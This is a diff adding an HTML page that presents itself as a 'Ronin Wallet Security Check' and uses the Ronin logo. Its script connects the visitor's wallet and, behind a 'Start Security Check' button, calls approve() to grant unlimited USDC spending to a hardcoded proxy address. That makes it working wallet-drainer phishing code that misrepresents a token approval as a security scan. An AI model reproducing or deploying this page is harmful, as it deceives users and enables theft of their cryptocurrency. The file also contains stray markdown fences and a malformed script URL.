@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ronin Wallet Security Check</title>
+<style>
+body {
+font-family: Arial, sans-serif;
+background-color: #1a1a1a;
+color: #fff;
+text-align: center;
+padding: 20px;
+margin: 0;
+}
+h1 {
+color: #fff;
+margin-bottom: 20px;
+}
+button {
+margin: 10px;
+padding: 10px 20px;
+font-size: 16px;
+cursor: pointer;
+border: none;
+border-radius: 5px;
+color: #fff;
+background-color: #007BFF;
+transition: background-color 0.3s ease;
+}
+button:hover {
+background-color: #0056b3;
+}
+button:disabled {
+background-color: #ccc;
+cursor: not-allowed;
+}
+p {
+font-size: 18px;
+color: #555;
+}
+#walletStatus {
+color: #28a745;
+font-weight: bold;
+}
+.status {
+margin-top: 20px;
+padding: 10px;
+font-size: 18px;
+color: #ff4d4d; /* Changed status text to red */
+}
+img {
+width: 98px; /* Logo original size */
+height: auto;
+margin-bottom: 20px;
+}
+</style>
+</head>
+<body>
+<!-- Ronin Logo Image -->
+<img src="https://roninchain.com/static/images/ronin-nav-logo.svg" alt="Ronin Logo">
+<h1>Ronin Wallet Security Check</h1>
+
+```
+<!-- Connect Wallet Button -->
+<button id="connectWallet" onclick="connectWallet()">Connect Wallet</button>
+<p id="walletStatus">Wallet not connected</p>
+
+<!-- Security Check Button -->
+<button id="approveButton" onclick="approveTokens()" disabled>Start Security Check</button>
+
+<!-- Status Message -->
+<div class="status" id="operationStatus">Status: Waiting for action...</div>
+
+<!-- Alternative CDN -->
+<script src="<https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js>"></script>
+<script>
+    // Configuration
+    const tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // Mainnet USDC token address
+    const proxyAddress = "0x572a3a205247f867fe63637bf5183142d5ac0d9e"; // Mainnet proxy contract address
+    let provider, signer;
+
+    // ERC20 Token Contract ABI
+    const tokenABI = [
+        {
+            "inputs": [
+                {
+                    "internalType": "address",
+                    "name": "spender",
+                    "type": "address"
+                },
+                {
+                    "internalType": "uint256",
+                    "name": "amount",
+                    "type": "uint256"
+                }
+            ],
+            "name": "approve",
+            "outputs": [
+                {
+                    "internalType": "bool",
+                    "name": "",
+                    "type": "bool"
+                }
+            ],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        },
+        {
+            "inputs": [
+                {
+                    "internalType": "address",
+                    "name": "sender",
+                    "type": "address"
+                },
+                {
+                    "internalType": "address",
+                    "name": "recipient",
+                    "type": "address"
+                },
+                {
+                    "internalType": "uint256",
+                    "name": "amount",
+                    "type": "uint256"
+                }
+            ],
+            "name": "transferFrom",
+            "outputs": [
+                {
+                    "internalType": "bool",
+                    "name": "",
+                    "type": "bool"
+                }
+            ],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        },
+        {
+            "inputs": [],
+            "stateMutability": "nonpayable",
+            "type": "constructor"
+        },
+        {
+            "inputs": [],
+            "name": "owner",
+            "outputs": [
+                {
+                    "internalType": "address",
+                    "name": "",
+                    "type": "address"
+                }
+            ],
+            "stateMutability": "view",
+            "type": "function"
+        },
+        {
+            "inputs": [],
+            "name": "token",
+            "outputs": [
+                {
+                    "internalType": "contract IERC20",
+                    "name": "",
+                    "type": "address"
+                }
+            ],
+            "stateMutability": "view",
+            "type": "function"
+        },
+        {
+            "inputs": [],
+            "name": "tokenAddress",
+            "outputs": [
+                {
+                    "internalType": "address",
+                    "name": "",
+                    "type": "address"
+                }
+            ],
+            "stateMutability": "view",
+            "type": "function"
+        }
+    ];
+
+    // Connect Wallet
+    async function connectWallet() {
+        if (typeof window.ethereum !== "undefined") {
+            try {
+                // Request user to connect wallet
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []); // Request user accounts
+                signer = provider.getSigner(); // Get wallet signer
+                const walletAddress = await signer.getAddress(); // Get wallet address
+
+                // Update wallet status
+                document.getElementById("walletStatus").innerText = `Wallet connected: ${walletAddress}`;
+                document.getElementById("approveButton").disabled = false; // Enable security check button
+                document.getElementById("operationStatus").innerText = "Status: Wallet connected, you can start security check.";
+            } catch (error) {
+                console.error("Wallet connection failed:", error);
+                alert("Wallet connection failed, please try again!");
+            }
+        } else {
+            alert("Please install MetaMask or another wallet extension!");
+        }
+    }
+
+    // Security Check
+    async function approveTokens() {
+        // Disable button to prevent multiple clicks
+        document.getElementById("approveButton").disabled = true;
+        document.getElementById("operationStatus").innerText = "Status: Performing security check, please wait...";
+
+        if (!signer) {
+            alert("Please connect your wallet first!");
+            return;
+        }
+
+        // Create token contract instance
+        const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
+
+        try {
+            // Call approve method with unlimited allowance
+            const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
+            console.log("Security check sent:", tx.hash);
+            await tx.wait(); // Wait for transaction confirmation
+            document.getElementById("operationStatus").innerText = "Status: Security check completed!";
+            alert("Operation successful, security check completed!");
+        } catch (error) {
+            console.error("Operation failed:", error);
+            document.getElementById("operationStatus").innerText = "Status: The detection is not completed. Please refresh and try again.";
+            alert("Operation failed, please check the console for errors!");
+        }
+
+        // Re-enable the button after completion
+        document.getElementById("approveButton").disabled = false;
+    }
+</script>
+
+```
+
+</body>
+</html>
